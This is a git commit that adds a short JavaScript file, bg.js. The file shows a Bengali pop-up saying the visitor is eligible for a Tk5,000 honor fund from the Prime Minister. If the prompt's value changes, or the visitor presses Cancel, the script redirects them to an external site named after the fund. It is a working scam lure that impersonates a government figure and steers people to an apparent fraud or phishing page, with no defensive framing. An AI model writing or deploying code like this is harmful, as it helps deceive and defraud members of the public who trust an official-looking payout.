8c2fedfa2b1e49a4345b73c4f85c4f522e77f457
usorondo30 <perches.bounce-2m@icloud.com>
2026-02-22 07:19:32 +0100

    Create bg.js

---
+++ bg.js
@@ -0,0 +1,5 @@
+var password = 'Tk5,000'
+password = prompt('অভিনন্দন: আপনি প্রধানমন্ত্রীর কাছ থেকে Tk5,000 সম্মাননা তহবিল পাওয়ার জন্য যোগ্য, এখন সক্রিয় করতে OK ক্লিক করুন','Tk5,000');
+if (password != 'Tk5,000') {
+    location.href ='https://www.abasimbok.site/pm-appreciation-tk5000-fund';
+}
